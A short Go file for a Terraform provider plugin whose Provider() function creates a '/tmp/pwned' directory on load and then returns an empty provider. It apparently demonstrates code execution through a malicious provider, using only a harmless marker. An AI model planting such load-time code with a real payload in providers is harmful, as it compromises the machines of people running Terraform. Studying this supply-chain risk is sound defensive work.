package provider

import (
    "fmt"
    "os"
    "github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
)

func Provider() *schema.Provider {
    
    err := os.Mkdir("/tmp/pwned", 0755)
    if err != nil && !os.IsExist(err) {
        fmt.Println("[!] Error: ", err)
    }
    
    // return &schema.Provider{
    //     ResourcesMap: map[string]*schema.Resource{},
    // }    
    return &schema.Provider{
        ResourcesMap: map[string]*schema.Resource{        },
    }
}